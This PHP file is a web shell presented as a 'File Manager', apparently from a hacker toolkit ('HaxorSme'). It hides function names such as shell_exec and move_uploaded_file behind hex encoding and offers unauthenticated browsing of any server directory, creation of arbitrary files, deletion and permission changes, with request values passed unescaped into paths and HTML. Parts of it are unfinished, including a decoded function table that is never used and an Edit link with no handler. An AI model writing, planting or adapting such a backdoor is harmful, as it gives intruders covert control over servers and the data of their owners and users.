<?php
session_start();

/**
 * HaxorSme File Manager
 **/

// Decoding hex-encoded function names into callable functions
function hex($str) {
    $r = "";
    $len = strlen($str) - 1;
    for ($i = 0; $i < $len; $i += 2) {
        $r .= chr(hexdec($str[$i].$str[$i + 1]));
    }
    return $r;
}

$a = [
    "7068705F756E616D65", "73657373696F6E5F7374617274", "6572726F725F7265706F7274696E67", "70687076657273696F6E", "66696C655F7075745F636F6E74656E7473", "66696C655F6765745F636F6E74656E7473", 
    "66696C657065726D73", "66696C656D74696D65", "66696C6574797065", "68746D6C7370656369616C6368617273", "737072696E7466", "737562737472", "676574637764", "6368646972", 
    "7374725F7265706C616365", "6578706C6F6465", "666C617368", "6D6F76655F75706C6F616465645F66696C65", "7363616E646972", "676574686F737462796E616D65", "7368656C6C5F65786563", 
    "53797374656D20496E666F726D6174696F6E", "6469726E616D65", "64617465", "6D696D655F636F6E74656E745F74797065", "66756E6374696F6E5F657869737473", "6673697A65", 
    "726D646972", "756E6C696E6B", "6D6B646972", "72656E616D65", "7365745F74696D655F6C696D6974", "636C656172737461746361636865", "696E695F736574", "696E695F676574", 
    "6765744F776E6572", "6765745F63757272656E745F75736572"
];

foreach ($a as $hex_str) {
    $f[] = hex($hex_str);
}

// Example function using the hex array to simulate a file manager
function flash($message, $status, $class, $redirect = false) {
    $_SESSION["message"] = $message;
    $_SESSION["class"] = $class;
    $_SESSION["status"] = $status;
    
    if ($redirect) {
        header('Location: ' . $redirect);
        exit();
    }
    return true;
}

// Get root path
$path = isset($_GET['dir']) ? $_GET['dir'] : $_SERVER['DOCUMENT_ROOT'];

$path = str_replace('\\', '/', $path);
$exdir = explode('/', $path);

// File size function
function fsize($file) {
    $a = ["B", "KB", "MB", "GB", "TB", "PB"];
    $pos = 0;
    $size = filesize($file);
    while ($size >= 1024) {
        $size /= 1024;
        $pos++;
    }
    return round($size, 2) . " " . $a[$pos];
}

// Create a new folder if form is submitted
if (isset($_POST['newFolderName'])) {
    $newDir = $path . '/' . $_POST['newFolderName'];
    if (!is_dir($newDir)) {
        mkdir($newDir);
        flash("Create Folder Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Folder already exists.", "Failed", "error", "?dir=$path");
    }
}

// Create a new file if form is submitted
if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) {
    $newFile = $path . '/' . $_POST['newFileName'];
    if (!file_exists($newFile)) {
        file_put_contents($newFile, $_POST['newFileContent']);
        flash("Create File Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("File already exists.", "Failed", "error", "?dir=$path");
    }
}

// Delete file/folder if requested
if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item'])) {
    $item = $path . '/' . $_GET['item'];
    if (is_dir($item)) {
        rmdir($item);
        flash("Folder deleted successfully", "Success", "success", "?dir=$path");
    } else {
        unlink($item);
        flash("File deleted successfully", "Success", "success", "?dir=$path");
    }
}

// Change file/folder permissions
if (isset($_POST['newPerm']) && isset($_GET['item'])) {
    $newPerm = $_POST['newPerm'];
    $item = $path . '/' . $_GET['item'];
    chmod($item, octdec($newPerm));
    flash("Permissions changed successfully!", "Success", "success", "?dir=$path");
}

// HTML structure
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Haxor File Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container mt-4">
        <h1 class="text-primary">File Manager</h1>
        <form method="POST" class="mb-4">
            <input type="text" name="newFolderName" class="form-control" placeholder="Enter Folder Name" required>
            <button type="submit" class="btn btn-success mt-2">Create Folder</button>
        </form>

        <form method="POST" class="mb-4">
            <input type="text" name="newFileName" class="form-control" placeholder="Enter File Name" required>
            <textarea name="newFileContent" class="form-control mt-2" placeholder="Enter File Content" required></textarea>
            <button type="submit" class="btn btn-success mt-2">Create File</button>
        </form>

        <div class="list-group">
            <?php
            $items = scandir($path);
            foreach ($items as $item) {
                if ($item == '.' || $item == '..') continue;

                $itemPath = $path . '/' . $item;
                echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
                echo "<strong>$item</strong>";
                echo "<div class='btn-group'>";
                echo "<a href='?dir=$path&action=delete&item=$item' class='btn btn-danger btn-sm'>Delete</a>";
                echo "<a href='?dir=$path&item=$item' class='btn btn-info btn-sm'>Edit</a>";
                echo "</div>";
                echo "</div>";
            }
            ?>
        </div>
    </div>
</body>
</html>
